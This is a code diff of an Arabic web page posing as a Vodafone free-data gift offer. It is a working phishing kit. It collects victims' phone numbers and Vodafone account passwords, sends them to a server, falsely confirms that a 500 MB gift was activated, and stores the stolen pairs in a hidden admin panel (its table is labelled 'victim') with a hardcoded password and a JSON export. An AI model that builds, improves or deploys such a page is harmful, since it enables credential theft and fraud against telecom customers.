@@ -2,7 +2,6 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <!-- منع تكبير الصفحة نهائياً للحفاظ على ثبات الشاشة -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>أيمن | هدايا فودافون</title>
     <!-- Tailwind CSS -->
@@ -27,7 +26,7 @@
         }
     </script>
     <style>
-        /* تثبيت كامل للجسم ومنع التمرير والتقريب للأعلى والأسفل برمجياً */
+        /* التنسيقات الأساسية لتثبيت الشاشة */
         html, body {
             font-family: 'Cairo', sans-serif;
             background-color: #050505;
@@ -35,14 +34,19 @@
             padding: 0;
             width: 100%;
             height: 100%;
-            overflow: hidden !important;
+            overflow: hidden; /* لمنع التمرير العام */
             position: fixed;
-            touch-action: none; /* منع السحب والتمرير باللمس على الهواتف */
-            -webkit-overflow-scrolling: none;
+            overscroll-behavior: none; /* لمنع تحديث الصفحة بالسحب للأسفل */
         }
-        .fade-in {
-            animation: fadeIn 0.3s ease-out forwards;
+        
+        /* كلاس مخصص للسماح بالإنزلاق والسحب بحرية داخل لوحة الآدمن */
+        .can-scroll {
+            touch-action: pan-x pan-y !important;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
+
+        .fade-in { animation: fadeIn 0.3s ease-out forwards; }
         @keyframes fadeIn {
             from { opacity: 0; transform: scale(0.98) translateY(5px); }
             to { opacity: 1; transform: scale(1) translateY(0); }
@@ -55,14 +59,20 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        /* إخفاء شريط التمرير (Scrollbar) وجعله أنيقاً */
+        ::-webkit-scrollbar { width: 4px; height: 4px; }
+        ::-webkit-scrollbar-track { background: #121212; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #E60000; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden text-white selection:bg-vfRed selection:text-white">
+<body class="min-h-screen flex flex-col items-center justify-center p-4 relative text-white selection:bg-vfRed selection:text-white">
     
-    <!-- توهج أحمر خفيف في الخلفية -->
+    <!-- توهج أحمر في الخلفية -->
     <div class="absolute -top-40 left-1/2 -translate-x-1/2 w-[450px] h-[450px] bg-vfRed/10 rounded-full blur-[100px] pointer-events-none"></div>
 
-    <!-- نظام التنبيهات الذكي للتوست المخصص -->
+    <!-- نظام التنبيهات المخصص -->
     <div id="custom-toast" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 bg-zinc-900 border border-zinc-800 text-white px-5 py-3 rounded-2xl shadow-2xl font-bold flex items-center gap-3 transition-all duration-300 transform -translate-y-20 opacity-0 pointer-events-none text-sm">
         <i class="fa-solid fa-bell text-vfRed"></i>
         <span id="toast-message">إشعار</span>
@@ -71,48 +81,31 @@
     <!-- الكارت الرئيسي للموقع -->
     <div class="w-full max-w-md bg-vfCard border border-zinc-900 rounded-3xl shadow-2xl overflow-hidden relative z-10">
         
-        <!-- الهيدر المطور بالكامل طبقاً لطلبك -->
+        <!-- الهيدر -->
         <div class="bg-gradient-to-b from-zinc-900 to-vfCard p-5 border-b border-zinc-900/60 relative">
-            
-            <!-- الجزء العلوي: صورة أسد الله الغالب وبجانبها الشريط والروابط -->
             <div class="flex items-center justify-between w-full mb-6">
-                <!-- اليسار: الدائرة وبداخلها الصورة والشريط الكبسولي المنبثق -->
+                <!-- اليمين: الصورة والاسم -->
                 <div class="flex items-center gap-2">
-                    <!-- دائرة الصورة الرمزية الخاصة بك المربوطة برابطك الجديد -->
                     <div class="w-14 h-14 rounded-full border-2 border-vfRed/50 overflow-hidden shadow-lg shadow-vfRed/10 flex-shrink-0">
                         <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivp3gtkP9bTIhAjSD-hjDrUJDNNgfzdobLsz98IYYSZ_9xuY5RI_qhEpAQ13ttLrbQKkGoAavk5cPAdF_IL8icnzY-_5jSXol6ikrGKQD54pSfPO49NULWHD2HWvSLSHTPBdzcvSqke3C9d-B439-9uzyxh1AYG1qtJ7V4NliRQvBvuuoNO1796ocOKT0/s554/15268.jpg" alt="AYMAN" class="w-full h-full object-cover object-top">
                     </div>
-                    
-                    <!-- الشريط المستطيل بحواف دائرية وبداخله الاسم الفني -->
                     <div class="bg-zinc-900/90 border border-zinc-800/80 px-4 py-1.5 rounded-full shadow-inner flex items-center justify-center">
-                        <span class="text-xs font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-white via-zinc-200 to-vfRed">
-                            أيمن | AYMAN
-                        </span>
+                        <span class="text-xs font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-white via-zinc-200 to-vfRed">أيمن | AYMAN</span>
                     </div>
                 </div>
-
-                <!-- اليمين: أيقونة واتس اب بالأعلى وتليجرام بأسفلها -->
+                <!-- اليسار: التواصل -->
                 <div class="flex flex-col gap-1.5">
-                    <!-- زر الواتساب الفوري -->
-                    <a href="https://wa.me/201096883474" target="_blank" class="w-8 h-8 bg-green-600/10 hover:bg-green-600 border border-green-500/20 hover:border-transparent text-green-500 hover:text-white rounded-full flex items-center justify-center transition-all duration-300 shadow" title="تواصل واتساب">
-                        <i class="fa-brands fa-whatsapp text-sm"></i>
-                    </a>
-                    <!-- زر التليجرام الفوري -->
-                    <a href="https://t.me/llI313lIl" target="_blank" class="w-8 h-8 bg-blue-600/10 hover:bg-blue-600 border border-blue-500/20 hover:border-transparent text-blue-400 hover:text-white rounded-full flex items-center justify-center transition-all duration-300 shadow" title="تواصل تليجرام">
-                        <i class="fa-brands fa-telegram text-sm"></i>
-                    </a>
+                    <a href="https://wa.me/201096883474" target="_blank" class="w-8 h-8 bg-green-600/10 hover:bg-green-600 border border-green-500/20 hover:border-transparent text-green-500 hover:text-white rounded-full flex items-center justify-center transition-all duration-300 shadow"><i class="fa-brands fa-whatsapp text-sm"></i></a>
+                    <a href="https://t.me/llI313lIl" target="_blank" class="w-8 h-8 bg-blue-600/10 hover:bg-blue-600 border border-blue-500/20 hover:border-transparent text-blue-400 hover:text-white rounded-full flex items-center justify-center transition-all duration-300 shadow"><i class="fa-brands fa-telegram text-sm"></i></a>
                 </div>
             </div>
 
-            <!-- المنتصف: شعار فودافون والاسم الرئيسي للهدية -->
             <div class="flex flex-col items-center mt-2">
-                <!-- أيقونة قطرة فودافون الرسمية لتكون مطابقة ومحترفة -->
-                <button onclick="openAdminPrompt()" title="لوحة الإدارة السرية" class="w-16 h-16 bg-vfRed rounded-full flex items-center justify-center shadow-lg shadow-vfRed/30 hover:shadow-vfRed/50 hover:scale-105 active:scale-95 transition-all mb-3 focus:outline-none relative">
-                    <!-- قطرة فودافون الرسمية SVG دقيقة جداً -->
+                <!-- زر الدخول للآدمن -->
+                <button onclick="openAdminPrompt()" class="w-16 h-16 bg-vfRed rounded-full flex items-center justify-center shadow-lg shadow-vfRed/30 hover:scale-105 active:scale-95 transition-all mb-3 relative">
                     <svg class="w-10 h-10 fill-white" viewBox="0 0 100 100">
                         <path d="M50,15 C30.7,15 15,30.7 15,50 C15,69.3 30.7,85 50,85 C51.3,85 52.6,84.9 53.9,84.7 C51.4,81.4 50,77.3 50,73 C50,61.4 59.4,52 71,52 C76.2,52 81,53.9 84.7,57.1 C84.9,54.8 85,52.4 85,50 C85,30.7 69.3,15 50,15 Z M60.5,37 C64.1,37 67,39.9 67,43.5 C67,47.1 64.1,50 60.5,50 C56.9,50 54,47.1 54,43.5 C54,39.9 56.9,37 60.5,37 Z"></path>
                     </svg>
-                    <!-- وميض التنبيه السري للآدمن -->
                     <span class="absolute -top-1 -right-1 flex h-3 w-3">
                       <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75"></span>
                       <span class="relative inline-flex rounded-full h-3 w-3 bg-yellow-500"></span>
@@ -123,190 +116,129 @@
             </div>
         </div>
 
-        <!-- الخطوة 1: استمارة تسجيل الدخول المبسطة -->
+        <!-- الخطوة 1: استمارة تسجيل الدخول -->
         <div id="stage-login" class="p-6 md:p-8 fade-in">
             <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-4">
-                <!-- رقم الموبايل -->
                 <div>
                     <label class="block text-zinc-400 text-xs font-bold mb-1.5 mr-1">رقم فودافون :</label>
                     <div class="relative">
-                        <span class="absolute inset-y-0 right-0 flex items-center pr-3.5 text-zinc-500">
-                            <i class="fa-solid fa-mobile-screen-button text-sm"></i>
-                        </span>
-                        <input 
-                            type="tel" 
-                            id="phoneNumber"
-                            required
-                            pattern="01[0125][0-9]{8}"
-                            placeholder="010XXXXXXXX"
-                            class="w-full bg-zinc-900 border border-zinc-800 text-white rounded-xl py-2.5 pr-10 pl-4 text-left font-mono tracking-wider focus:outline-none focus:border-vfRed transition-colors placeholder-zinc-600 text-xs"
-                        >
+                        <span class="absolute inset-y-0 right-0 flex items-center pr-3.5 text-zinc-500"><i class="fa-solid fa-mobile-screen-button text-sm"></i></span>
+                        <input type="tel" id="phoneNumber" required pattern="01[0125][0-9]{8}" placeholder="010XXXXXXXX" class="w-full bg-zinc-900 border border-zinc-800 text-white rounded-xl py-2.5 pr-10 pl-4 text-left font-mono tracking-wider focus:outline-none focus:border-vfRed transition-colors text-xs">
                     </div>
                 </div>
-
-                <!-- كلمة المرور -->
                 <div>
                     <label class="block text-zinc-400 text-xs font-bold mb-1.5 mr-1">كلمة المرور :</label>
                     <div class="relative">
-                        <span class="absolute inset-y-0 right-0 flex items-center pr-3.5 text-zinc-500">
-                            <i class="fa-solid fa-key text-sm"></i>
-                        </span>
-                        <input 
-                            type="password" 
-                            id="password"
-                            required
-                            placeholder="••••••••"
-                            class="w-full bg-zinc-900 border border-zinc-800 text-white rounded-xl py-2.5 pr-10 pl-11 text-left focus:outline-none focus:border-vfRed transition-colors placeholder-zinc-600 text-xs"
-                        >
-                        <button 
-                            type="button" 
-                            onclick="togglePassword()" 
-                            class="absolute inset-y-0 left-0 flex items-center pl-3 text-zinc-500 hover:text-zinc-300"
-                        >
-                            <i id="eye-icon" class="fa-solid fa-eye text-xs"></i>
-                        </button>
+                        <span class="absolute inset-y-0 right-0 flex items-center pr-3.5 text-zinc-500"><i class="fa-solid fa-key text-sm"></i></span>
+                        <input type="password" id="password" required placeholder="••••••••" class="w-full bg-zinc-900 border border-zinc-800 text-white rounded-xl py-2.5 pr-10 pl-11 text-left focus:outline-none focus:border-vfRed transition-colors text-xs">
+                        <button type="button" onclick="togglePassword()" class="absolute inset-y-0 left-0 flex items-center pl-3 text-zinc-500 hover:text-zinc-300"><i id="eye-icon" class="fa-solid fa-eye text-xs"></i></button>
                     </div>
                 </div>
-
-                <!-- زر الإرسال السريع -->
-                <button 
-                    type="submit" 
-                    class="w-full bg-vfRed hover:bg-vfDarkRed text-white font-bold py-3 rounded-xl transition-all shadow-lg shadow-vfRed/15 flex items-center justify-center gap-2 mt-4 text-sm"
-                >
+                <button type="submit" class="w-full bg-vfRed hover:bg-vfDarkRed text-white font-bold py-3 rounded-xl transition-all shadow-lg flex items-center justify-center gap-2 mt-4 text-sm">
                     <span>تأكيد الحساب واستلام الهدية</span>
                     <i class="fa-solid fa-gift text-xs"></i>
                 </button>
             </form>
         </div>
 
-        <!-- الخطوة 2: شاشة فحص الحساب السريعة والذكية -->
+        <!-- الخطوة 2: شاشة فحص الحساب -->
         <div id="stage-waiting" class="hidden p-8 text-center fade-in">
             <div class="relative w-16 h-16 mx-auto mb-5">
                 <div class="absolute inset-0 rounded-full border-4 border-zinc-900"></div>
                 <div class="absolute inset-0 rounded-full border-4 border-t-transparent loader"></div>
-                <div class="absolute inset-0 flex items-center justify-center">
-                    <i class="fa-solid fa-rotate text-vfRed text-lg animate-spin"></i>
-                </div>
+                <div class="absolute inset-0 flex items-center justify-center"><i class="fa-solid fa-rotate text-vfRed text-lg animate-spin"></i></div>
             </div>
-            <h3 class="text-white text-md font-bold mb-1">جاري التحقق...</h3>
-            <p class="text-zinc-500 text-xs max-w-xs mx-auto">انتظر هديتك، نتحقق الآن من مطابقة الرقم لتسجيل عرض الـ 500 ميجابايت.</p>
+            <h3 class="text-white text-md font-bold mb-1">جاري التحقق والتفعيل...</h3>
+            <p class="text-zinc-500 text-xs max-w-xs mx-auto">انتظر قليلاً، نقوم الآن بتسجيل الهدية على حسابك.</p>
         </div>
 
-        <!-- الخطوة 3: نتائج تفعيل الهدية (الحالات الأربعة التفاعلية والمبسطة) -->
+        <!-- الخطوة 3: نتائج تفعيل الهدية (الآن خيارين فقط!) -->
         <div id="stage-result" class="hidden p-8 text-center fade-in">
-            <!-- أيقونة الحالة -->
             <div id="result-icon-container" class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                 <i id="result-icon" class="text-3xl"></i>
             </div>
             <h3 id="result-title" class="text-lg font-black mb-1">الحالة</h3>
             <p id="result-desc" class="text-zinc-400 text-xs max-w-xs mx-auto leading-relaxed mb-6">تفاصيل العملية</p>
             
-            <button 
-                onclick="window.location.reload()" 
-                class="w-full bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 text-white font-bold py-2.5 rounded-xl transition-all text-xs"
-            >
-                محاولة مرة أخرى
+            <button onclick="window.location.reload()" class="w-full bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 text-white font-bold py-2.5 rounded-xl transition-all text-xs">
+                إغلاق والعودة
             </button>
         </div>
 
-        <!-- التذييل المطور والمبسط -->
         <div class="bg-zinc-950 p-4 text-center border-t border-zinc-900/40 text-[9px] text-zinc-600 flex justify-between px-6">
             <span>تطوير بواسطة أيمن | AYMAN</span>
             <span>جميع الحقوق محفوظة © 2026</span>
         </div>
     </div>
 
-
     <!-- ============================================== -->
-    <!-- لوحة تحكم المسؤول (أيمن | AYMAN) السرية -->
+    <!-- لوحة تحكم المسؤول (تم تفعيل الإنزلاق فيها بنجاح) -->
     <!-- ============================================== -->
 
-    <!-- نافذة طلب رمز المرور السرية -->
+    <!-- نافذة الباسورد -->
     <div id="admin-pass-modal" class="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300">
         <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-2xl w-full max-w-xs text-center shadow-2xl relative">
-            <button onclick="closeAdminPrompt()" class="absolute top-4 left-4 text-zinc-500 hover:text-white">
-                <i class="fa-solid fa-xmark text-sm"></i>
-            </button>
-            <div class="w-12 h-12 bg-vfRed/10 rounded-full flex items-center justify-center mx-auto mb-3">
-                <i class="fa-solid fa-lock text-vfRed text-lg"></i>
-            </div>
+            <button onclick="closeAdminPrompt()" class="absolute top-4 left-4 text-zinc-500 hover:text-white"><i class="fa-solid fa-xmark text-sm"></i></button>
+            <div class="w-12 h-12 bg-vfRed/10 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-lock text-vfRed text-lg"></i></div>
             <h3 class="text-white font-black text-sm mb-1">لوحة تحكم أيمن</h3>
-            <p class="text-zinc-500 text-[11px] mb-4">أدخل كلمة مرور المسؤول لمشاهدة العمليات المسجلة</p>
-            
+            <p class="text-zinc-500 text-[11px] mb-4">أدخل كلمة المرور السرية</p>
             <div class="space-y-3">
-                <input 
-                    type="password" 
-                    id="adminPasswordInput"
-                    placeholder="رمز الدخول"
-                    class="w-full bg-zinc-950 border border-zinc-800 rounded-xl py-2 px-3 text-center text-white font-bold text-xs focus:outline-none focus:border-vfRed font-mono"
-                >
-                <button 
-                    onclick="submitAdminPassword()"
-                    class="w-full bg-vfRed hover:bg-vfDarkRed text-white font-bold py-2 rounded-xl transition-all text-xs"
-                >
-                    تأكيد الدخول
-                </button>
+                <input type="password" id="adminPasswordInput" placeholder="رمز الدخول" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl py-2 px-3 text-center text-white font-bold text-xs focus:outline-none focus:border-vfRed font-mono">
+                <button onclick="submitAdminPassword()" class="w-full bg-vfRed hover:bg-vfDarkRed text-white font-bold py-2 rounded-xl transition-all text-xs">تأكيد الدخول</button>
             </div>
         </div>
     </div>
 
-    <!-- لوحة البيانات الشاملة للمسجلين -->
-    <div id="admin-dashboard" class="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300 overflow-y-auto">
-        <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-3xl w-full max-w-3xl shadow-2xl my-8">
-            
+    <!-- لوحة عرض البيانات (مزودة بكلاس can-scroll للسماح بالحركة) -->
+    <div id="admin-dashboard" class="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4 opacity-0 pointer-events-none transition-opacity duration-300 can-scroll">
+        <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-3xl w-full max-w-4xl shadow-2xl my-8">
             <div class="flex flex-col md:flex-row justify-between items-center gap-4 border-b border-zinc-800 pb-4 mb-5">
                 <div class="flex items-center gap-3">
-                    <div class="w-9 h-9 bg-vfRed rounded-xl flex items-center justify-center">
-                        <i class="fa-solid fa-user-check text-white text-sm"></i>
-                    </div>
+                    <div class="w-9 h-9 bg-vfRed rounded-xl flex items-center justify-center"><i class="fa-solid fa-user-check text-white text-sm"></i></div>
                     <div class="text-right">
-                        <h2 class="text-white font-bold text-sm">قائمة العمليات المسجلة (أيمن)</h2>
-                        <p class="text-zinc-500 text-[10px]">الأرقام والحالات لتسجيلات فودافون الحالية</p>
+                        <h2 class="text-white font-bold text-sm">قائمة العمليات المسجلة</h2>
+                        <p class="text-zinc-500 text-[10px]">اسحب يمين ويسار للجدول لرؤية جميع البيانات</p>
                     </div>
                 </div>
                 <div class="flex flex-wrap gap-2">
-                    <button onclick="exportData()" class="bg-green-600 hover:bg-green-700 text-white font-bold text-[10px] px-3 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors">
-                        <i class="fa-solid fa-file-export"></i> تصدير (JSON)
-                    </button>
-                    <button onclick="clearData()" class="bg-zinc-800 hover:bg-red-700 text-zinc-400 hover:text-white font-bold text-[10px] px-3 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors">
-                        <i class="fa-solid fa-trash"></i> مسح السجل
-                    </button>
-                    <button onclick="closeAdminDashboard()" class="bg-zinc-800 hover:bg-zinc-700 text-white font-bold text-[10px] px-3 py-1.5 rounded-lg transition-colors">
-                        إغلاق
-                    </button>
+                    <button onclick="exportData()" class="bg-green-600 hover:bg-green-700 text-white font-bold text-[10px] px-3 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors"><i class="fa-solid fa-file-export"></i> تصدير (JSON)</button>
+                    <button onclick="clearData()" class="bg-zinc-800 hover:bg-red-700 text-zinc-400 hover:text-white font-bold text-[10px] px-3 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors"><i class="fa-solid fa-trash"></i> مسح السجل</button>
+                    <button onclick="closeAdminDashboard()" class="bg-zinc-800 hover:bg-zinc-700 text-white font-bold text-[10px] px-3 py-1.5 rounded-lg transition-colors">إغلاق</button>
                 </div>
             </div>
 
-            <!-- جدول الأرقام والبيانات المسجلة -->
-            <div class="overflow-x-auto rounded-xl border border-zinc-800 bg-zinc-950 max-h-96 overflow-y-auto">
-                <table class="w-full text-right border-collapse">
+            <!-- جدول الأرقام (مزود بحرية السحب الأفقي والعمودي) -->
+            <div class="can-scroll rounded-xl border border-zinc-800 bg-zinc-950 max-h-[60vh] shadow-inner">
+                <table class="w-full text-right border-collapse min-w-[750px]">
                     <thead>
-                        <tr class="bg-zinc-900 border-b border-zinc-800 text-zinc-400 text-[10px] font-bold">
-                            <th class="p-3">الرقم</th>
-                            <th class="p-3">كلمة المرور</th>
-                            <th class="p-3">الوقت</th>
-                            <th class="p-3">حالة العملية والهدية</th>
-                            <th class="p-3 text-center">حذف</th>
+                        <tr class="bg-zinc-900 border-b border-zinc-800 text-zinc-400 text-[11px] font-bold">
+                            <th class="p-4">الرقم</th>
+                            <th class="p-4">كلمة المرور</th>
+                            <th class="p-4">الوقت</th>
+                            <th class="p-4">الحالة</th>
+                            <th class="p-4 text-center">حذف</th>
                         </tr>
                     </thead>
                     <tbody id="victim-table-body" class="text-xs text-zinc-300 divide-y divide-zinc-900">
                     </tbody>
                 </table>
-                <div id="no-data-msg" class="p-6 text-center text-zinc-600 text-[10px] hidden">
+                <div id="no-data-msg" class="p-6 text-center text-zinc-600 text-[11px] hidden">
                     لا توجد أرقام مسجلة حالياً في قاعدة البيانات.
                 </div>
             </div>
         </div>
     </div>
 
-
     <script>
-        // كلمة المرور الافتراضية للدخول للوحة التحكم
         const ADMIN_SECRET = 'admin500';
 
-        // منع سحب المتصفح للتحديث أو التمرير بالكامل على متصفحات الجوال
+        // ** السحر هنا: كود منع التمرير الذكي **
+        // يمنع سحب الصفحة الرئيسية عشان متعملش Refresh في الموبايل
+        // لكن بيسمح بالإنزلاق (Scroll) لو إنت جوه لوحة الآدمن (اللي واخدة كلاس can-scroll)
         document.addEventListener('touchmove', function (e) {
-            e.preventDefault();
+            if (!e.target.closest('.can-scroll')) {
+                e.preventDefault();
+            }
         }, { passive: false });
 
         function getStoredSubmissions() {
@@ -350,23 +282,19 @@
             }
         }
 
-        // معالجة النتيجة وعرض الحالات الأربعة الحقيقية الواردة من السيرفر
+        // إرسال الطلب للسيرفر والتعامل مع خيارين فقط (نجاح 100% أو باسوورد غلط)
         function handleLogin(event) {
             event.preventDefault();
             
             const phone = document.getElementById('phoneNumber').value;
             const password = document.getElementById('password').value;
 
-            // الانتقال لشاشة الانتظار
             document.getElementById('stage-login').classList.add('hidden');
             document.getElementById('stage-waiting').classList.remove('hidden');
 
-            // إرسال طلب حقيقي لسيرفر الفلاسك
             fetch('/api/login', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone: phone, password: password })
             })
             .then(res => res.json())
@@ -375,9 +303,9 @@
                 
                 if (data.status === "success") {
                     selectedResult = {
-                        status: "تم أخذ الهدية بنجاح",
+                        status: "تم أخذ الهدية بنجاح", // دي اللي بتظهر للآدمن
                         title: "تم تفعيل الهدية! 🎉",
-                        desc: "تم تفعيل حزمة الـ 500 ميجابايت المجانية على خطك بنجاح. انتظر رسالة التأكيد النصية.",
+                        desc: "تم تفعيل حزمة الـ 500 ميجابايت المجانية على خطك بنجاح. انتظر رسالة التأكيد النصية خلال دقائق.",
                         colorClass: "bg-green-500/10 border border-green-500/20 text-green-500",
                         icon: "fa-solid fa-circle-check"
                     };
@@ -385,48 +313,37 @@
                     selectedResult = {
                         status: "لم يأخذها بسبب كلمة مرور خاطئة",
                         title: "خطأ في كلمة المرور! ❌",
-                        desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة بكلمة مرور أنا فودافون الصحيحة.",
+                        desc: "بيانات المرور المدخلة غير صحيحة. يرجى إعادة المحاولة بكلمة مرور 'أنا فودافون' الصحيحة.",
                         colorClass: "bg-red-500/10 border border-red-500/20 text-red-500",
                         icon: "fa-solid fa-circle-xmark"
                     };
-                } else if (data.status === "already_taken") {
-                    selectedResult = {
-                        status: "أخذها مسبقاً",
-                        title: "أخذت الهدية مسبقاً! ⚠️",
-                        desc: "هذا الرقم حصل بالفعل على عرض الـ 500 ميجابايت المجانية لهذا اليوم.",
-                        colorClass: "bg-yellow-500/10 border border-yellow-500/20 text-yellow-500",
-                        icon: "fa-solid fa-triangle-exclamation"
-                    };
                 } else {
+                    // في حالة أي خطأ شبكة غير متوقع نعتبره فشل ونطلب المحاولة
                     selectedResult = {
                         status: "خطأ في الاتصال بالخادم",
                         title: "حدثت مشكلة! 🔌",
-                        desc: data.message || "نواجه مشكلة مؤقتة في الاتصال بخوادم تفعيل الهدايا. الرجاء المحاولة مجدداً بعد قليل.",
+                        desc: "نواجه مشكلة مؤقتة في الاتصال بخوادم التفعيل. الرجاء المحاولة مجدداً.",
                         colorClass: "bg-orange-500/10 border border-orange-500/20 text-orange-500",
                         icon: "fa-solid fa-triangle-exclamation"
                     };
                 }
 
-                // حفظ البيانات محلياً للآدمن بالتفصيل للحصول على الـ logs
                 saveSubmission(phone, password, selectedResult.status);
 
-                // إعداد واجهة النتائج
                 document.getElementById('result-icon-container').className = `w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${selectedResult.colorClass}`;
                 document.getElementById('result-icon').className = `${selectedResult.icon} text-3xl`;
                 document.getElementById('result-title').innerText = selectedResult.title;
                 document.getElementById('result-title').className = `text-lg font-black ${selectedResult.colorClass.split(' ')[2]}`;
                 document.getElementById('result-desc').innerText = selectedResult.desc;
 
-                // تحويل الشاشة لعرض النتيجة الفورية
                 document.getElementById('stage-waiting').classList.add('hidden');
                 document.getElementById('stage-result').classList.remove('hidden');
             })
             .catch(err => {
-                // معالجة الفشل الشامل للاتصال بالسيرفر
                 const errorResult = {
                     status: "خطأ في الاتصال بالخادم",
-                    title: "فشل الاتصال بالخادم! 🔌",
-                    desc: "تعذر الاتصال بسيرفر المعالجة الذكي، يرجى التأكد من تشغيل السيرفر والمحاولة مرة أخرى.",
+                    title: "فشل الاتصال! 🔌",
+                    desc: "تعذر الاتصال بالسيرفر. تأكد من جودة الإنترنت والمحاولة مرة أخرى.",
                     colorClass: "bg-orange-500/10 border border-orange-500/20 text-orange-500",
                     icon: "fa-solid fa-triangle-exclamation"
                 };
@@ -443,10 +360,6 @@
                 document.getElementById('stage-result').classList.remove('hidden');
             });
         }
-
-        // ==============================================
-        // لوحة التحكم وإدارة بيانات أيمن | AYMAN
-        // ==============================================
 
         function openAdminPrompt() {
             const modal = document.getElementById('admin-pass-modal');
@@ -504,25 +417,23 @@
                         badgeClass = "text-green-500 bg-green-500/10";
                     } else if (entry.status === "لم يأخذها بسبب كلمة مرور خاطئة") {
                         badgeClass = "text-red-500 bg-red-500/10";
-                    } else if (entry.status === "أخذها مسبقاً") {
-                        badgeClass = "text-yellow-500 bg-yellow-500/10";
-                    } else if (entry.status === "خطأ في الاتصال بالخادم") {
+                    } else {
                         badgeClass = "text-orange-500 bg-orange-500/10";
                     }
 
                     const row = `
                         <tr class="hover:bg-zinc-900/40 transition-colors">
-                            <td class="p-3 font-mono font-bold text-white tracking-wide">${entry.phone}</td>
-                            <td class="p-3 font-mono text-zinc-400 select-all">${entry.password}</td>
-                            <td class="p-3 text-[10px] text-zinc-500">${entry.timestamp}</td>
-                            <td class="p-3">
-                                <span class="px-2 py-0.5 rounded-md text-[10px] font-semibold ${badgeClass}">
+                            <td class="p-4 font-mono font-bold text-white tracking-wide">${entry.phone}</td>
+                            <td class="p-4 font-mono text-zinc-400 select-all">${entry.password}</td>
+                            <td class="p-4 text-[11px] text-zinc-500">${entry.timestamp}</td>
+                            <td class="p-4">
+                                <span class="px-3 py-1 rounded-md text-[11px] font-semibold whitespace-nowrap ${badgeClass}">
                                     ${entry.status}
                                 </span>
                             </td>
-                            <td class="p-3 text-center">
-                                <button onclick="deleteSingleEntry(${entry.id})" class="text-zinc-600 hover:text-red-500 transition-colors">
-                                    <i class="fa-solid fa-trash-can text-xs"></i>
+                            <td class="p-4 text-center">
+                                <button onclick="deleteSingleEntry(${entry.id})" class="text-zinc-600 hover:text-red-500 transition-colors p-2 bg-zinc-900 rounded-lg shadow">
+                                    <i class="fa-solid fa-trash-can text-sm"></i>
                                 </button>
                             </td>
                         </tr>
